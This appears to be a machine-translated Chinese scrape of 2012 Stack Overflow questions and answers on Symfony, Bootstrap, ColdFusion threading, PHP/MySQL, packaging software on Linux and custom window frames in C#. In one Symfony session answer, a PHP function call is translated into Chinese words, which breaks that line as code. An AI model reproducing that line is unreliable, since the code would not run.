几乎，你对目录结构的基本理解是正确的。也就是说，您应该避免修改核心 CodeIgniter 类，而应该根据需要扩展它们。

Helpers 不仅仅是“包含你自己的功能”。助手可以是您的函数或内置函数，但这些是核心 MVC 集之外的类/函数，它们“帮助”完成某些事情，例如表单构建或其他例行任务。

# symfony - 使用 capifony 部署 Symfony2 应用程序在缓存预热时失败

> ID：12460162
> 
> 赞同：2
> 
> 时间：2012-09-17T13:23:11.463
> 
> 标签：symfony, capistrano, capifony

我已经为此奋斗了几个小时，但现在我被困住了，我无法继续前进。

当 Capifony 进入缓存预热阶段时，尝试加载供应商类时失败，但供应商目录的路径似乎是错误的；

```
** [out :: example.com] PHP Fatal error:  main(): Failed opening required '/var/www/example.com/releases/20120917131025/src/MyBundle/Bundle/ProcessBundle/Controller../../../../../../vendor/quail/quail/quail.php' (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/example.com/releases/20120917131025/src/MyBundle/Bundle/ProcessBundle/Controller/DefaultController.php on line 0 
```

您可以看到它没有正确构建目录；

```
ProcessBundle/Controller../../ 
```

应该

```
ProcessBundle/Controller/../../ 
```

它无法加载的特定供应商目录/类实际上在 repo 中，它唯一没有通过 bin/vendors 加载，因为它在公共 git repo 中不可用。

我的 deploy.rb 很平静，它并不总是这样，但是在过去的几个小时里不断地评论和改变值已经造成了损失。

```
set :application, "project"
set :domain,      "example.com"
set :deploy_to,   "/var/www/example.com/"
set :app_path,    "app"
set :repository,  "git@github.com:project/project.git"
set :scm,         :git
set :deploy_via, :remote_cache
set :model_manager, "doctrine"
# Or: `propel`
role :web,        domain                         # Your HTTP server, Apache/etc
role :app,        domain                         # This may be the same as your `Web`     server
role :db,         domain, :primary => true       # This is where Symfony2 migrations will     run
set  :keep_releases,  3
set :user, "deployer-user"
set :runner, "deployer-user"
set :webserver_user,    "deployer-user"
set :branch, "master"
set :port, 2222
# Be more verbose by uncommenting the following line
logger.level = Logger::MAX_LEVEL
default_run_options[:pty] = true
ssh_options[:forward_agent] = true
set   :use_sudo,      false
set :shared_files,      ["app/config/parameters.ini"]
set :shared_children,     [app_path + "/logs", web_path + "/uploads", "vendor"]
# set :update_vendors,    true
# set :use_composer, true 
```

提前致谢。

*编辑*我有一条要求杀死它的路径。更新，现在它工作正常。结束问题。

# html - Twitter Bootstrap 导航栏 - 右对齐控件

> ID：12460173
> 
> 赞同：2
> 
> 时间：2012-09-17T13:23:47.383
> 
> 标签：html, css, twitter-bootstrap

我正在使用 Twitter Bootstrap (v2.1.1) 并尝试自定义各种导航栏元素的位置/对齐方式。

这是一个 jsFiddle，显示了导航栏的简化版本：

[http://jsfiddle.net/fmdataweb/nhnH6/2/](http://jsfiddle.net/fmdataweb/nhnH6/2/)

我希望搜索输入表单显示为右对齐，但在最后一个“下拉 2”之前。我尝试改变：

```
<form class="navbar-search pull-left" action=""> 
```

至：

```
<form class="navbar-search pull-right" action=""> 
```

但这使得搜索输入表单成为最后一个导航栏项目，而不是我想要实现的第二个最后一个项目。

这是否可以让第二个搜索输入表单最后对齐到右侧？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-17T13:51:39.077

您可以将 2 个右对齐元素放在一个 div 中。

```
<div style="display: inline-block;" class="pull-right"> ... </div> 
```

这是一个工作示例：http: [//jsfiddle.net/nhnH6/3/](http://jsfiddle.net/nhnH6/3/)

# asp.net-mvc - 无法添加 ASP.NET MVC 控制器

> ID：12460179
> 
> 赞同：1
> 
> 时间：2012-09-17T13:24:04.907
> 
> 标签：asp.net-mvc, vb.net, entity-framework, controller

我是 ASP.NET MVC 的新手，尽管可以称自己为 Web 表单领域的经验丰富的程序员。我现在正在学习MVC。尝试使用实体框架取消添加控制器。下面是模型类的代码：

```
Imports System.Data.Entity
Public Class Users
    Public Property ID() As Integer
    Public Property Login() As String
    Public Property Password() As String
    Public Property Avatar() As Image
    Public Property Country() As Integer
    Public Property City() As Integer
    Public Property Phone() As String
    Public Property Email() As String
    Public Property Registered() As Date
End Class
Public Class StopSaleDBContext
    Inherits DbContext
    Public Property Users() As DbSet(Of Users)
End Class 
```

当我添加控制器时，出现错误无法从 ProjectName.Users 检索元数据对象引用未设置为对象实例。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T23:14:44.697

编译您的项目并重试。

# php - 如何从 Symfony2 应用程序获取第三方应用程序会话数据？

> ID：12460180
> 
> 赞同：1
> 
> 时间：2012-09-17T13:24:07.660
> 
> 标签：php, symfony

为了实现跨应用程序身份验证（如果用户已经登录到其他应用程序，则登录到我的 Symfony2 应用程序），我创建了一个 Symfony2 侦听器类来检查有关用户的特定数据是否在会话中。此数据来自非 Symfony2（但 PHP）应用程序。

问题是我在课堂上使用的会话对象中不存在来自其他应用程序的会话数据。

这是侦听器（简化）类：

```
<?php
class OldAppAuthenticationListener
{
    /** @var \Symfony\Component\Security\Core\SecurityContext */
    private $context;

    public function __construct(SecurityContext $context)
    {
        $this->context = $context;
    }

    public function onKernelRequest(GetResponseEvent $event)
    {
        if (HttpKernel::MASTER_REQUEST != $event->getRequestType()) {
            // don't do anything if it's not the master request
            return;
        }

        if (!$this->context->isGranted('IS_AUTHENTICATED_FULLY')) {
            $request = $event->getRequest();
            $session = $request->getSession();

            $userName = $session->get('nomUtilisateur');

            $token = new PreAuthenticatedToken($userName, null, 'secured_area', array('ROLE_USER'));

            $session->set('_security_secured_area',  serialize($token));
        }
    }
} 
```

它在 services.yml 中注册，如下所示：

```
services:
    my_app.listener.old_app_authentication:
        class: Acme\MyAppBundle\Listener\MyAppAuthenticationListener
        arguments: ["@security.context"]
        tags:
            - { name: kernel.event_listener, event: kernel.request } 
```

但是`$session->get('nomUtilisateur')`总是返回 NULL（并且`$session->all()`只`$_SESSION`返回一些 Symfony2 特定的变量），尽管其他应用程序将所有这些数据存储在会话中。

当然，我对两个应用程序使用相同的 cookie 会话域（在 config.yml 中配置），我可以轻松检查 PHPSESSID 是否相同。

所以这是我的问题：为什么旧的应用程序会话变量不可用，如何从我的侦听器类中获取它们？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-06T02:22:39.327

[如此处](http://symfony.com/doc/master/components/http_foundation/sessions.html#session-data-management)所述，Symfony2 使用会话包来存储会话内容。这意味着您必须直接访问`$_SESSION`超全局才能获得此类功能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-23T07:38:34.777

对我来说，解决方案是直接使用 php session fonctions。我还必须检查两个应用程序上的会话名称、域和保存路径是否相同。

在我的 symfony 中，我必须添加：
session_save_path('c:/wamp/tmp');
会话名称（_SESSION_ID_）；
session_start();
然后使用 $_SESSION

另一种给我但我没有使用的方法是直接使用会话文件，如下所示：

“诀窍是使用浏览器发送的会话 cookie。

例如，一个用 PHP 编写的旧 Web 应用程序向浏览器发送了一个名为 IntranetSession 的 cookie。因为我知道 PHP 将会话文件存储在哪里，所以我只是打开了该文件，并使用 session_decode() 对其内容进行解码。这样做的缺点是 session_decode() 将它的输出直接放入 $_SESSION，覆盖了你当前的会话数据（甚至是 Symfony 放在那里的东西）。基本上规则如下：

```
$sessionData = file_get_contents($sessionFile);<br>
$tmpSess = $_SESSION;<br>
session_decode($sessionData);<br>
$otherAppSession = $_SESSION;<br>
$_SESSION = $tmpSess;<br> 
```

“

希望这会有所帮助！

# ios5 - 使用情节提要实现自定义启动画面的最佳实践

> ID：12460181
> 
> 赞同：0
> 
> 时间：2012-09-17T13:24:20.433
> 
> 标签：ios5, uistoryboard, uistoryboardsegue, uianimation

我一直在使用以下方法设计自定义启动画面：

*   我有一个在情节提要中被定义为 rootview 控制器的启动画面控制器。
*   闪屏控制器负责制作自己的屏幕截图和我想继续使用的自定义容器控制器。当屏幕截图都处理完毕后，我允许用户继续到容器控制器（通过执行自定义模态搜索）。

我认为这种方法有两个问题：

1.  即使我不再需要启动画面控制器，它仍在内存中。
2.  我正在为我的自定义容器控制器中包含的第一个控制器加载视图 2 次：一次是在我制作容器控制器的屏幕截图时，另一次是在我以模态方式呈现 containerview 控制器时。

是否可以在容器控制器的视图甚至加载之前使用情节提要以模态方式呈现启动画面？当闪屏被解除时，我可以有一个自定义的 segue 吗？

# ipad - Wordpress 下拉菜单始终在 iPad 上打开

> ID：12460183
> 
> 赞同：0
> 
> 时间：2012-09-17T13:24:37.350
> 
> 标签：ipad, wordpress, drop-down-menu, menu

我使用模板 Citizen Journal。我不知道它是否仅适用于此模板，但有一个安静烦人的问题。

顶部菜单在 iPad 上显示不正确。

我在这里上传了桌面截图和 iPad 上的第二张截图：http: [//imgur.com/a/yeNCY](http://imgur.com/a/yeNCY)

可以看到菜单变成了一个一直打开的下拉菜单。它阻止了不同页面的视图，这真的很烦人。

如果你有 iPad，你可以测试一下：http: [//www.professorparticular.org/](http://www.professorparticular.org/)

我已经搜索了很多解决方案，但没有什么接近我所拥有的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T15:25:10.797

您使用的主题似乎是响应式主题，并根据屏幕尺寸/分辨率更改内容尺寸。当您在屏幕较小的设备上查看网站时，它将删除和/或移动页面上的某些元素。

一个快速解决方法是转到主题文件中的 header.php 文件并从顶部删除第 5 行。要删除的行是`<meta name="viewport" content="width=device-width" />`。这应该可以解决您的菜单问题。无需实际进入主题的 CSS 和 HTML 并对其进行重新编码，这可能是您最简单的选择。

# extjs - ExtJs 4.1 再次回调作用域

> ID：12460184
> 
> 赞同：1
> 
> 时间：2012-09-17T13:24:37.747
> 
> 标签：extjs, callback, scope, extjs4.1

`this`调用回调函数时如何保持？

```
init: function() {

 console.log( this ); // constructor, YES!

 this.readConfig();
},

readConfig: function() {

 console.log( this ); // constructor, YES!

 this.httpApi.request({
    module   : 'monitor',
    func     : 'getConfig',
    success  : this.readConfigCallback,
    scope    : this
 });
},

readConfigCallback: function(oResponse) {

 console.log( this ); // Window, NO!

 var oView = this.getView(); // error... 
```

}

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T13:26:51.140

Use ...

```
success: Ext.bind(this.readConfigCallback, this) 
```

... instead to bind the object's context to the callback function specifically. Otherwise this function will be called in the global context, and its `this` function will refer to `window`.

# multithreading - Coldfusion限制线程总数

> ID：12460185
> 
> 赞同：4
> 
> 时间：2012-09-17T13:24:38.077
> 
> 标签：multithreading, coldfusion, cfhttp

我有一些代码试图创建 100 个线程 http 调用。它似乎被限制在40左右。

当我执行 threadJoin 时，我的 http 调用只得到 38 - 40 组结果，尽管循环是从 1 到 100。

```
// thread http calls
pages = 100;

for (page="1";page <= pages; page++) {

    thread name="req#page#" {

        grabber.setURL('http://site.com/search.htm');
        // request headers
        grabber.addParam(type="url",name="page",value="#page#");
        results = grabber.send().getPrefix();

        arrayAppend(VARIABLES.arrResults,results.fileContent);
    }
}

// rejoin threads
for (page="2";page <= pages; page++) {
    threadJoin('req#page#',10000);
} 
```

CF 可以创建的线程数有限制吗？它与在后台运行的Java有关吗？还是不能处理那么多http请求？

有比线程 HTTP 调用更好的方法吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-17T14:54:35.940

您看到的结果可能是因为您的变量不是线程安全的。

```
grabber.addParam(type="url",name="page",value="#page#"); 
```

该行正在访问`Variables.Page`，由所有生成的线程共享。因为线程在不同的时间开始，所以 的值`page`通常与你认为的值不同。这将导致多个线程具有相同的`page`.

相反，如果您将`page`属性作为属性传递给线程，那么每个线程将拥有自己的变量版本，最终您将获得 100 个唯一值。(1-100)。

此外，您也在写入共享变量。

```
arrayAppend(VARIABLES.arrResults,results.fileContent); 
```

ArrayAppend 不是线程安全的，您将使用`VARIABLES.arrResults`其自身的其他版本覆盖版本，而不是附加每个位。

您想将结果设置为一个`thread`变量，然后在连接完成后访问它。

```
thread name="req#page#" page=Variables.page {

    grabber.setURL('http://site.com/search.htm');
    // request headers
    grabber.addParam(type="url",name="page",value="#Attributes.page#");
    results = grabber.send().getPrefix();

    thread.Result = results.fileContent;
} 
```

和加入：

```
// rejoin threads
for (page="2";page <= pages; page++) {
    threadJoin('req#page#',10000);
    arrayAppend(VARIABLES.arrResults, CFThread['req#page#'].Result);
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T13:47:33.990

在 ColdFusion 管理员中，有一个设置同时运行的数量，我的默认为 10。其余的显然是排队的。一个 Phantom42 提到，您可以增加正在运行的 CF 线程的数量，但是，如果有 100 个或更多线程，您可能会遇到其他问题。

在 32 位进程上，您的整个进程只能使用 2gig 的内存。每个线程都使用一定量的堆栈内存，这不是堆的一部分。由于您的 Java Binary+Heap+Non-Heap(PermGen)+(threads*512k) 很容易超过 2-gig 限制，因此我们遇到了大量线程内存不足的问题。

您还必须允许足够的线程来处理上面的代码，以及进入您的应用程序的其他请求，这可能会使整个应用程序陷入困境。

我建议更改您的代码以创建 N 个线程，每个线程执行超过 1 个请求。这是更多的工作，但你打破了 N requests=N Threads 问题。您可以采取以下几种方法：

*   如果您认为每个请求将花费大致相同的时间，那么您可以拆分工作并在启动每个线程之前为每个线程分配一部分工作。

*   或者每个线程从列表中选择一个 URL 并对其进行处理，然后您可以加入所有 N 个线程。不过，您需要确保在用于跟踪进度的任何计数器周围都设置了锁定。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T13:31:05.047

检查您`Maximum number of running JRun threads`在 ColdFusion Administrator 中的 Request Tuning 选项卡下的设置。默认值为 50。

# php - Zend Framework 2：代理作为路由器约束

> ID：12460186
> 
> 赞同：0
> 
> 时间：2012-09-17T13:24:45.103
> 
> 标签：php, constraints, router, zend-framework2

在 Zend Framework 2 路由器中，有一个选项可以在路由部分上添加约束。现在这些约束检查正则表达式条件。有没有办法使用委托函数作为检查？

像这样：

```
<?php
$array = array(
    'router' => array(
        'routes' => array(
            'album' => array(
                'type'    => 'segment',
                'options' => array(
                    'route'    => '/album[/:action][/:id]',
                    'constraints' => array(
                        'action' => function ($c) { 
                            if ($c == "testets")
                            {
                               return TRUE;
                            } else
                            {
                               return FALSE;

                            }
                        },
                        'id'     => '[0-9]+',
                    ),
                    'defaults' => array(
                        'controller' => 'Album\Controller\Album',
                        'action'     => 'index',
                    ),
                ),
            ),
        ),
    )
);
?> 
```

或者是否有具有此功能的路由器库？

# php - PHP 在将 ip2long 插入我的数据库时遇到问题

> ID：12460189
> 
> 赞同：0
> 
> 时间：2012-09-17T13:24:59.607
> 
> 标签：php, mysql, sql, ip

所以我把我的网站上传到我刚买的网络服务器上，一切都在我的电脑上完美运行。但是现在我在我的数据库中插入数据时遇到了问题，我将问题追溯到创建插入每行插入的行的用户的 IP 地址。

我有一个返回值的 php 函数，`ip2long`它看起来像这样：

```
function ip2()
    {
        return ip2long($_SERVER['REMOTE_ADDR']);
    } 
```

然后将其插入到我的数据库中，sql 代码如下所示：

```
$sql = "INSERT INTO `Users` 
                    (
                        `Username`,
                        `Password`,
                        `Email`,
                        `ip_created`
                    )
                    VALUES 
                    (
                        '".$db->sql_escape(htmlspecialchars($this->username, ENT_QUOTES))."',
                        '".$db->sql_escape($this->secure_pass)."',
                        '".$db->sql_escape($this->clean_email)."',
                        '".ip2()."'
                    )";

$db->sql_query($sql)) 
```

该`ip_created`字段`int`的长度为 10

所有的数据库交互都在一个 php 类中处理，也许这可能是一个问题。

我真的不知道问题出在哪里，它真的开始困扰我。一切都在我的本地主机版本上运行良好。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:30:33.677

[id2long 手册页注释包含：](http://php.net/manual/en/function.ip2long.php)

> 请注意，当您运行 64 位系统时，ip2long 将生成不适合 MySQL INT 的 64 位整数，您可以使用 BIGINT 或 INT UNSIGNED 因为在 64 位系统上 ip2long 永远不会返回负整数。另请参阅[https://bugs.php.net/bug.php?id=54338](https://bugs.php.net/bug.php?id=54338)

这可能是原因吗？

# html - Bootstrap NavBar 在 IE8 中不显示

> ID：12460190
> 
> 赞同：1
> 
> 时间：2012-09-17T13:25:01.907
> 
> 标签：html, css, internet-explorer-8, twitter-bootstrap

我的网站使用 bootstrap 2.1.1，在 IE8 中显示时发现了很多“问题”。问题之一是导航栏，我在这里简化并复制“错误”：

[http://doxadigital.com/scrape/menutest.html](http://doxadigital.com/scrape/menutest.html)

默认情况下所有 .css 和 .js ，显示导航栏的代码也取自引导文档（为了减少拼写错误/语法错误）

如您所见，菜单的内容在 IE8 中不显示，而在其他浏览器中显示。

有什么解决办法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-10T14:08:26.077

我已经删除了隐藏的溢出并且不起作用。但是做这个

```
.navbar-inner{ filter:none;} 
```

而不是在 bootstrap.css

```
filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffffff', endColorstr='#fff2f2f2', GradientType=0); 
```

我可以在 IE 8 和 9 中看到我的导航栏

希望有帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:41:59.920

我认为 bootstrap.min.css 中有一些 hack

在“.collapse”类中删除隐藏的溢出然后你会得到你的输出:-)

# excel - named table with an expandable range of cells (Excel 2003)

> ID：12460191
> 
> 赞同：0
> 
> 时间：2012-09-17T13:25:04.933
> 
> 标签：excel

In Excel 2003 I have table like this:

![enter image description here](../Images/aa34fbd8b8c12eeb5a9459aaa524302f.png)

How can I create named table with an expandable range of cells (not using VBA)?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-06T21:20:26.390

@Brettdj 提供了一个解决方案，但因为缺少这样的答案：

1.  放入`=RAND()*0+201`B2 - 这不会影响 B2 的结果，但由于 =RAND 是一个易失性函数，它会在更改时强制更新命名范围数组。
2.  将名称的范围定义为`=OFFSET($B$2,0,0,COUNT($B$2:$B$200),1)`（或将 200 美元调整为更合适的名称）。

如果范围命名为 say `Bcolumn`now `=SUM(Bcolumn`) 在您的示例中将返回 3,618 `=SUM(B2:B19`，但是如果在 B20 中插入 201，则后者将保持为 3,618，而前者将返回 3,819。

# php - Auto delete sql table

> ID：12460195
> 
> 赞同：0
> 
> 时间：2012-09-17T13:25:08.507
> 
> 标签：php

How do make auto delete SQL table records on every month. For example: we have 3 columns. DATE, NAME and ADDRESS. So when daily entry to that table , it stores in table. I need to delete all these records save in another table and make it empty in every month.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:34:42.643

您需要为此设置一个 cronjob，例如：

```
#this will run every 1'st of the month at 00:00 AM
0 0 1 * * /usr/bin/php -f /path/to/script.php 
```

和`script.php`：

```
<?php
    $db = new PDO('mysql:host=localhost;dbname=testdb;charset=UTF-8', 'username', 'password', array(PDO::ATTR_EMULATE_PREPARES => false, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));

    $monthYear = date('mY', strtotime('-1 day')); // last month
    $table = 'addresses'; // current table name
    $newTable = $table.'_'.$monthYear; // new table name oldTable_monthYear

    try {
        $db->beginTransaction();
        $query = $db->query("CREATE TABLE `".$newTable ."` LIKE `".$table ."`"); // create new table like old one
        $query = $db->query("INSERT INTO `".$newTable ."` SELECT * FROM `".$table ."`"); // insert values in new table
        $query = $db->query("TRUNCATE TABLE `".$table ."`"); // truncate old table
    } catch(PDOException $ex) {
        $db->rollBack(); // something went wrong, rollback all actions
        echo $ex->getMessage(); // output error
    }
?> 
```

# linux - 如何将软件编译成可重新安装的形式？

> ID：12460198
> 
> 赞同：0
> 
> 时间：2012-09-17T13:25:13.693
> 
> 标签：linux, compilation, software-distribution

我正在完成对同一软件的第 7 次重新编译。没有可用的预构建包，而且编译时间很长。有没有办法把我编译的东西打包起来，这样我就不必不断地从源代码构建它？

编辑：如果重要的话，CentOS 6 for the OS。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:20:19.013

你应该看看[CDE](http://www.pgbovine.net/cde.html)。从其网站：

> CDE（以前称为 CDEpack）自动打包在其他机器上部署和运行 Linux 程序所需的代码、数据和环境，无需任何安装或配置。CDE 是完全消除依赖地狱的最简单方法。

所以它会编译你的程序，并在生成的包中包含所有依赖项。生成的包应该能够在任何现代 x86 Linux 发行版上运行，因此您不必不断地从源代码构建它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:58:42.337

[checkinstall](http://asic-linux.com.mx/~izto/checkinstall/)基于[installwatch](http://asic-linux.com.mx/~izto/checkinstall/installwatch.html)，能够创建适合您发行版的包管理器的各种包，包括`.deb`（Debian，Ubuntu，...），`.rpm`（Red Hat，Fedora，SuSE，...）和（Slackware）。`.tgz`

# c# - 如何防止 NC_CALCSIZE 调整我的表单大小？C＃

> ID：12460208
> 
> 赞同：2
> 
> 时间：2012-09-17T13:25:43.823
> 
> 标签：c#

我正在创建一个自定义表单（C#/Windows Forms/Vista/Windows7），并覆盖 WndProc 以捕获 WM_NCPAINT、WM_NCCALCSIZE 和 WM_NCHITTEST 以绘制自定义框架。我几乎完成了它，但有一个我无法解决的问题。

问题是 NC_CALCSIZE 使我的表单在最大化后恢复时缩小。我用谷歌搜索并找到了 Bob Powell 的答案，他说当 WPARAM 为 TRUE 时我不需要处理 NC_CALCSIZE。在我这样做之后，WM_NCPAINT 不再起作用（它确实处理了 WM_NCPAINT，但它不再绘制非客户区，只有在我使其无效之后）。

因此，恢复，当我处理 WM_NCCALCSIZE(WPARAM == TRUE) 时，它会缩小我的表单，当我不处理时，它不会再绘制了。

以前有人遇到过这个问题吗？如果需要更多代码，我可以提供。谢了。

这是我的 WN_CALCSIZE 代码：

```
private void WndProcNonClientCalcSize(ref Message m)
    {
        if (m.WParam == WinAPI.FALSE)
        {
            this.Log(MethodInfo.GetCurrentMethod(), "FALSE");

            WinAPI.NCCALCSIZE_PARAMS csp;
            csp = (WinAPI.NCCALCSIZE_PARAMS)Marshal.PtrToStructure(m.LParam, typeof(WinAPI.NCCALCSIZE_PARAMS));
            csp.rectProposed.Top += this._nonClientHeight;
            csp.rectProposed.Bottom -= this._nonClientBorderThickness;
            csp.rectProposed.Left += this._nonClientBorderThickness;
            csp.rectProposed.Right -= this._nonClientBorderThickness;
            Marshal.StructureToPtr(csp, m.LParam, false);
        }
        else if (m.WParam == WinAPI.TRUE)
        {
            this.Log(MethodInfo.GetCurrentMethod(), "TRUE");

            WinAPI.NCCALCSIZE_PARAMS csp;
            csp = (WinAPI.NCCALCSIZE_PARAMS)Marshal.PtrToStructure(m.LParam, typeof(WinAPI.NCCALCSIZE_PARAMS));
            csp.rectProposed.Top += this._nonClientHeight;
            csp.rectProposed.Bottom -= this._nonClientBorderThickness;
            csp.rectProposed.Left += this._nonClientBorderThickness;
            csp.rectProposed.Right -= this._nonClientBorderThickness;
            Marshal.StructureToPtr(csp, m.LParam, false);
        }

        m.Result = WinAPI.TRUE;
    } 
```

这是我的 WM_NCPAINT 代码：

```
private bool WndProcNonClientPaint(ref Message m)
    {
        this.Log(MethodInfo.GetCurrentMethod(), string.Empty);

        this.PaintNonClient(m.HWnd, (IntPtr)m.WParam);
        m.Result = WinAPI.TRUE;
        return true;
    }

    private void PaintNonClient(IntPtr hWnd, IntPtr hRgn)
    {
        WinAPI.RECT windowRect = new WinAPI.RECT();
        WinAPI.GetWindowRect(hWnd, ref windowRect);

        Rectangle bounds = new Rectangle(0, 0,
            windowRect.Right - windowRect.Left,
            windowRect.Bottom - windowRect.Top);

        if (bounds.Width == 0 || bounds.Height == 0)
            return;

        Region clipRegion = new Region(bounds);

        if (hRgn != (IntPtr)1)
            clipRegion = Region.FromHrgn(hRgn);

        WinAPI.DCV dcv =
                WinAPI.DCV.WINDOW |
                WinAPI.DCV.INTERSECTRGN |
                WinAPI.DCV.CACHE |
                WinAPI.DCV.CLIPSIBLINGS;

        IntPtr hDC =
            WinAPI.GetDCEx(
                hWnd,
                hRgn,
                dcv);

        if (hDC == IntPtr.Zero)
            hDC = WinAPI.GetWindowDC(hWnd);

        IntPtr compatiblehDC = WinAPI.CreateCompatibleDC(hDC);
        IntPtr compatibleBitmap = WinAPI.CreateCompatibleBitmap(hDC, bounds.Width, bounds.Height);

        try
        {
            WinAPI.SelectObject(compatiblehDC, compatibleBitmap);
            WinAPI.BitBlt(compatiblehDC, 0, 0, bounds.Width, bounds.Height, hDC, 0, 0, WinAPI.SRCCOPY);

            using (Graphics g = Graphics.FromHdc(compatiblehDC))
            {
                Rectangle outterEdge = new Rectangle(0, 0, this.Width, this.Height);

                int x = this._nonClientBorderThickness;
                int y = this._nonClientHeight;
                int width = this.Width - (this._nonClientBorderThickness * 2);
                int height = this.Height - this._nonClientBorderThickness - this._nonClientHeight;

                Rectangle innerEdge = new Rectangle(x, y, width, height);

                GraphicsPath path = new GraphicsPath();

                path.AddRectangle(outterEdge);
                path.AddRectangle(innerEdge);

                using (SolidBrush brush = new SolidBrush(Color.FromArgb(45, 45, 48)))
                    g.FillPath(brush, path);

                path.Dispose();
            }

            WinAPI.BitBlt(hDC, 0, 0, bounds.Width, bounds.Height, compatiblehDC, 0, 0, WinAPI.SRCCOPY);
        }
        finally
        {
            WinAPI.DeleteObject(compatibleBitmap);
            WinAPI.DeleteDC(compatiblehDC);
        }
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T23:42:52.793

好吧，我无法让它工作，看来返回 WM_NCCALCSIZE 比我预期的要复杂。我根本无法理解它，因为它没有做我期望它做的事情。我试图按照这篇文章所说的去做，但同样没有用：

[http://blogs.msdn.com/b/oldnewthing/archive/2003/09/15/54925.aspx](http://blogs.msdn.com/b/oldnewthing/archive/2003/09/15/54925.aspx)

所以我再次用谷歌搜索，我在 CodeProject 上找到了这篇文章，描述了我遇到的同样问题：

[http://www.codeproject.com/Articles/55180/Extending-the-Non-Client-Area-in-Aero](http://www.codeproject.com/Articles/55180/Extending-the-Non-Client-Area-in-Aero)

解决方法是听 WM_SYSCOMMAND 并捕获 SC_RESTORE，将我的表单宽度和高度设置为最大化/恢复。

我的 WM_NCCALCSIZE 变成了这样：

```
 private void WndProcNonClientCalcSize(ref Message m)
    {
        if (m.WParam == WinAPI.FALSE)
        {
            this.Log(MethodInfo.GetCurrentMethod(), "FALSE");

            WinAPI.RECT rect = (WinAPI.RECT)Marshal.PtrToStructure(m.LParam, typeof(WinAPI.RECT));
            rect.Left += this._nonClientBorderThickness;
            rect.Top += this._nonClientHeight;
            rect.Right -= this._nonClientBorderThickness;
            rect.Bottom -= this._nonClientBorderThickness;
            Marshal.StructureToPtr(rect, m.LParam, false);

            m.Result = WinAPI.FALSE;
        }
        else if (m.WParam == WinAPI.TRUE)
        {
            this.Log(MethodInfo.GetCurrentMethod(), "TRUE");

            WinAPI.NCCALCSIZE_PARAMS csp;
            csp = (WinAPI.NCCALCSIZE_PARAMS)Marshal.PtrToStructure(m.LParam, typeof(WinAPI.NCCALCSIZE_PARAMS));

            WinAPI.RECT rectNewClient = csp.rectProposed;

            rectNewClient.Left += this._nonClientBorderThickness;
            rectNewClient.Top += this._nonClientHeight;
            rectNewClient.Right -= this._nonClientBorderThickness;
            rectNewClient.Bottom -= this._nonClientBorderThickness;

            csp.rectProposed = rectNewClient;
            csp.rectBeforeMove = csp.rectProposed;

            Marshal.StructureToPtr(csp, m.LParam, false);

            m.Result = (IntPtr)(WinAPI.NCCALCSIZE_RESULTS.ValidRects);
        }
    } 
```

和我的 WM_SYSCOMMAND：

```
 private void WndProcSysCommand(ref Message m)
    {
        UInt32 param;
        if (IntPtr.Size == 4)
            param = (UInt32)(m.WParam.ToInt32());
        else
            param = (UInt32)(m.WParam.ToInt64());

        if ((param & 0xFFF0) == (int)WinAPI.SystemCommands.SC_RESTORE)
        {
            this.Height = this._storedHeight;
            this.Width = this._storedWidth;
        }
        else if (this.WindowState == FormWindowState.Normal)
        {
            this._storedHeight = this.Height;
            this._storedWidth = this.Width;
        }
        base.WndProc(ref m);
    } 
```

这可能不是最好的解决方案，但完成了工作。如果有人能提供更好的解决方案，我真的很感激。

Tks，Hans Passant 和 Tergiver，请注意。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-07T11:19:35.647

这不是问题`WM_NCCALCSIZE`。处理时`WM_NCCALCSISE`，.NET 调用`RestoreWindowBoundsIfNecessary()`方法，因此窗口的大小发生了变化（请参阅[使用 SetWindowPlacement 更改窗口的恢复位置不适用于每个窗口](https://stackoverflow.com/questions/3126041/changing-a-windows-restore-position-using-setwindowplacement-doesnt-work-on-ev)）。您可以在表单最小化时手动缓存表单的大小并在恢复时重置，或者不调用基本`WndProc()`方法，该方法调用`RestoreWindowBoundsIfNecessary()`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-28T17:16:15.840

我得到了不同的结果，实际上我想获得公众对此解决方案的意见：

```
protected override void SetBoundsCore(int x, int y, int width, int height, BoundsSpecified specified)
{
    width += BORDER_LEFT_WIDTH + BORDER_RIGHT_WIDTH;
    height += BORDER_TOP_HEIGHT + TITLEBAR_HEIGHT + BORDER_BOTTOM_HEIGHT;
    base.SetBoundsCore(x, y, width, height, specified);
} 
```

实际上，这抵消了我在处理类似问题时遇到的收缩。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-08-04T04:09:02.350

看起来这个问题有更优雅的解决方案，虽然仍然很老套。请参阅[使用 DWM 自定义窗口框架：如何正确处理 WM_NCCALCSIZE](https://stackoverflow.com/questions/20085317/custom-window-frame-with-dwm-how-to-handle-wm-nccalcsize-correctly)。

不同之处在于，这里的解决方案要么改变窗口大小导致重绘/闪烁，要么人为地缩小边界，而上面帖子中的解决方案只是说你的窗口没有标题/边框，因此窗口和客户区的大小是相等的。

顺便说一句，如果您希望客户区占据所有窗口大小 WndProcNonClientCalcSize 可以简化为

```
private void WndProcNonClientCalcSize(ref Message m)
{
  m.Result = IntPtr.Zero;
} 
```

# css - 闪光灯周围的白色背景 谷歌浏览器中的标签

> ID：12460209
> 
> 赞同：0
> 
